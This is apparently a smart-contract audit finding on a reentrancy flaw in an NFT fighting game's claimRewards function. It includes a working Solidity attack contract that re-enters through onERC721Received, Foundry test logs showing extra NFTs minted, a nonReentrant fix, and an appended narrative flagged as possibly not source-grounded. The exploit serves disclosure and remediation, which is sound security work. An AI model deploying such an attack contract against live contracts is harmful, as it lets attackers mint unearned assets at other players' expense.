---
id: 20743
severity: "High"
---

# Player can mint more fighter NFTs during claim of rewards by leveraging reentrancy on the `claimRewards

## Description

When a fighting round ends, winners for the current round get picked and allocated respective rewards. These rewards are fighter NFTs that can be claimed by such winners. When you claim your rewards for a round or several rounds, the `numRoundsClaimed` state variable which stores the number of rounds you’ve claimed for gets updated to reflect your claim and each winner can only ever claim up to the amounts they win for each given round. That means if you try to batch-claim for two given rounds for which you won 2 fighter NFTs, your NFT count after the claim should be whatever your current balance of NFT is plus 2 fighter NFTs.

The issue here is that there’s a way to mint additional fighter NFTs on top of the fighter NFTs you’re owed for winning even though the `claimRewards` function has implemented a decent system to prevent over-claims. For one, it’s relatively complex to spoof a call pretending to be the `_mergingPoolAddress` to mint but a malicious user doesn’t need to worry too much about that to mint more fighters; they just need to leverage using a smart contract for engineering a simple reentrancy.

## Proof of Concept

Consider this call path that allows a malicious user to reach this undesired state:

  1. In-session fight round gets finalized.
  2. An admin picks winners for the just finalized round.
  3. Alice, one of the winners is entitled to 2 fighter NFTs just like Bob and decides to claim rewards for the rounds she participated in but keep in mind she joined the game with a smart contract.
  4. Alice calls `claimRewards` supplying the args `(string[] calldata modelURIs, string[] calldata modelTypes, uint256[2][] calldata customAttributes)`
  5. Those are valid arguments, hence the loop proceeds to make 2 NFT mints to her address.
  6. Her address, being a smart contract manages to reenter the call to mint additional NFTs.
  7. Alice ends up with more fighter NFTs instead of 2. Bob, who is an EOA gets the 2 NFTs he’s owed but Alice has managed to gain more.

The root cause of this issue stems from the `roundId`. The amount of times you can reenter the `claimRewards` function depends on the `roundId`. So let’s say the `roundId` is 3, it mints 6 NFTs:

  * First loop mints once
  * Reenter mints the second time
  * Reenter again mints the third time
  * Cannot reenter anymore
  * Control is released so the call goes back to the second loop & finishes the mint
  * Call goes back & finishes the second and third mint
  * Alice or malicious caller ends up with 6 NFTs instead of 3

Here’s a POC to show one such attack path in the code Place the code in the `MergingPool.t.sol` test contract and do the setup: `testReenterPOC` is the attack POC test

Attack contract:
```solidity
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
contract Attack is IERC721Receiver {
    
    address owner;
    uint256 tickets = 0;
    MergingPool mergingPool;
    FighterFarm fighterFarm;

    constructor(address mergingPool_, address fighterFarm_) {
        mergingPool = MergingPool(mergingPool_);
        fighterFarm = FighterFarm(fighterFarm_);
        owner = msg.sender;
    }
    function reenter() internal {
        ++tickets;
        if (tickets < 100) {
            (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
            mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
        }
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) public returns (bytes4) {
        reenter();
        return IERC721Receiver.onERC721Received.selector;
    }
    function attack() public {
        (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
        mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
    } 

    function setInformation() public pure returns (string[] memory, string[] memory, uint256[2][] memory) {
        string[] memory _modelURIs = new string[](3);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[2] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        string[] memory _modelTypes = new string[](3);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        _modelTypes[2] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](3);
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);
        _customAttributes[2][0] = uint256(1);
        _customAttributes[2][1] = uint256(80);

        return (_modelURIs, _modelTypes, _customAttributes);
    }  
}

function testReenterPOC() public {

    address Bob = makeAddr("Bob");
    Attack attacker = new Attack(address(_mergingPoolContract), address(_fighterFarmContract));
    
    _mintFromMergingPool(address(attacker));
    _mintFromMergingPool(Bob);

    assertEq(_fighterFarmContract.ownerOf(0), address(attacker));
    assertEq(_fighterFarmContract.ownerOf(1), Bob);

    uint256[] memory _winners = new uint256[](2);
    _winners[0] = 0;
    _winners[1] = 1;

     // winners of roundId 0 are picked
    _mergingPoolContract.pickWinner(_winners);
    assertEq(_mergingPoolContract.isSelectionComplete(0), true);  
    assertEq(_mergingPoolContract.winnerAddresses(0, 0) == address(attacker), true);
    // winner matches ownerOf tokenId
    assertEq(_mergingPoolContract.winnerAddresses(0, 1) == Bob, true);

    string[] memory _modelURIs = new string[](2);
    _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
    _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
    
    string[] memory _modelTypes = new string[](2);
    _modelTypes[0] = "original";
    _modelTypes[1] = "original";
    uint256[2][] memory _customAttributes = new uint256[2][](2);
    _customAttributes[0][0] = uint256(1);
    _customAttributes[0][1] = uint256(80);
    _customAttributes[1][0] = uint256(1);
    _customAttributes[1][1] = uint256(80);
    // winners of roundId 1 are picked

    uint256 numberOfRounds = _mergingPoolContract.roundId();
    console.log("Number of Rounds: ", numberOfRounds);

    _mergingPoolContract.pickWinner(_winners);
    _mergingPoolContract.pickWinner(_winners);

    console.log("------------------------------------------------------");

    console.log("Balance of attacker (Alice) address pre-claim rewards: ", _fighterFarmContract.balanceOf(address(attacker)));
    // console.log("Balance of Bob address pre-claim rewards: ", _fighterFarmContract.balanceOf(Bob));

    uint256 numRewardsForAttacker = _mergingPoolContract.getUnclaimedRewards(address(attacker));
    
    // uint256 numRewardsForBob = _mergingPoolContract.getUnclaimedRewards(Bob);

    console.log("------------------------------------------------------");

    console.log("Number of unclaimed rewards attacker (Alice) address has a claim to: ", numRewardsForAttacker);
    // console.log("Number of unclaimed rewards Bob address has a claim to: ", numRewardsForBob);
    
    // vm.prank(Bob);
    // _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);

    vm.prank(address(attacker));
    attacker.attack();

    uint256 balanceOfAttackerPostClaim = _fighterFarmContract.balanceOf(address(attacker));

    console.log("------------------------------------------------------");
    console.log("Balance of attacker (Alice) address post-claim rewards: ", balanceOfAttackerPostClaim);
    // console.log("Balance of Bob address post-claim rewards: ", _fighterFarmContract.balanceOf(Bob));
}
```

Malicious user leveraging reentrancy test result:
```
[PASS] testReenterPOC() (gas: 3999505)
Logs:
  Number of Rounds:  1
  ------------------------------------------------------
  Balance of attacker (Alice) address pre-claim rewards:  1
  ------------------------------------------------------
  Number of unclaimed rewards attacker (Alice) address has a claim to:  3
  ------------------------------------------------------
  Balance of attacker (Alice) address post-claim rewards:  7
```

Non-malicious users test POC:
```solidity
function testNormalEOAClaim() public {
        _mintFromMergingPool(_ownerAddress);
        _mintFromMergingPool(_DELEGATED_ADDRESS);
        
        assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);
        assertEq(_fighterFarmContract.ownerOf(1), _DELEGATED_ADDRESS);

        uint256[] memory _winners = new uint256[](2);
        _winners[0] = 0;
        _winners[1] = 1;

        // winners of roundId 0 are picked
        _mergingPoolContract.pickWinner(_winners);
        assertEq(_mergingPoolContract.isSelectionComplete(0), true);
        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);
        // winner matches ownerOf tokenId
        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == _DELEGATED_ADDRESS, true);

        string[] memory _modelURIs = new string[](2);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";

        string[] memory _modelTypes = new string[](2);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](2);
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);
        // winners of roundId 1 are picked

        uint256 numberOfRounds = _mergingPoolContract.roundId();
        console.log("Number of Rounds: ", numberOfRounds);

        _mergingPoolContract.pickWinner(_winners);

        console.log("Balance of owner address pre-claim rewards: ", _fighterFarmContract.balanceOf(address(this)));
        console.log("Balance of delegated address pre-claim rewards: ", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));

        uint256 numRewardsForWinner = _mergingPoolContract.getUnclaimedRewards(_ownerAddress);
        
        uint256 numRewardsForDelegated = _mergingPoolContract.getUnclaimedRewards(_DELEGATED_ADDRESS);
        // emit log_uint(numRewardsForWinner);

        console.log("Number of unclaimed rewards owner address has a claim to: ", numRewardsForWinner);
        console.log("Number of unclaimed rewards delegated address has a claim to: ", numRewardsForDelegated);

        // winner claims rewards for previous roundIds
        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);
        vm.prank(_DELEGATED_ADDRESS);
        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);

        console.log("Balance of owner address post-claim rewards: ", _fighterFarmContract.balanceOf(address(this)));
        console.log("Balance of delegated address post-claim rewards: ", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));
    }
```

Non-malicious users doing a normal claim result:
```
[PASS] testNormalEOAClaim() (gas: 2673123)
Logs:
  Number of Rounds:  1
  Balance of owner address pre-claim rewards:  1
  Balance of delegated address pre-claim rewards:  1
  Number of unclaimed rewards owner address has a claim to:  2
  Number of unclaimed rewards delegated address has a claim to:  2
  Balance of owner address post-claim rewards:  3
  Balance of delegated address post-claim rewards:  3
```

## Recommendation

Use a `nonReentrant` modifier for the `claimRewards` function.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a reentrancy flaw in the reward‑claiming function of the fighting game contract. When a round ends, winners are allowed to call claimRewards to receive a fixed number of fighter NFTs. The function iterates over the list of rewards, mints an ERC‑721 token for each reward, and then updates a state variable that records how many rounds have been claimed. Because the mint operation triggers the ERC721Receiver callback on the recipient contract, a malicious winner that is itself a contract can execute additional calls to claimRewards from within onERC721Received before the original function finishes updating its bookkeeping. This re‑entry allows the attacker to repeat the mint loop multiple times for the same round, effectively inflating the number of NFTs received beyond the amount they are entitled to. The root cause is the classic checks‑effects‑interactions issue: the contract updates the claim‑tracking variable after performing an external call (the NFT mint), giving the external contract a window to re‑enter. The attack works only when the winner is a contract capable of receiving ERC‑721 tokens and invoking claimRewards again, and the number of possible re‑entries is bounded by the round identifier, which determines how many mint iterations are performed. In practice, an attacker can end up with, for example, seven NFTs when only three were owed, as demonstrated by the test suite. The impact is a distortion of the game’s economics: the attacker gains an unfair advantage, the total supply of fighter NFTs is artificially increased, and honest participants receive a smaller share of value. The issue was discovered during a security audit that included reentrancy testing; it is subtle because the minting logic appears internal and the state variable seems protected, yet the external callback provides an unexpected entry point. The bug belongs to the class of reentrancy vulnerabilities that arise from improper ordering of state updates and external calls. To remediate, the contract should follow the checks‑effects‑interactions pattern by updating the claim‑tracking state before invoking any external contract, or protect the function with a nonReentrant guard (e.g., OpenZeppelin’s ReentrancyGuard). This prevents the attacker’s contract from re‑entering claimRewards during the mint process, ensuring that each winner receives exactly the number of NFTs they earned and preserving the intended accounting of rewards.
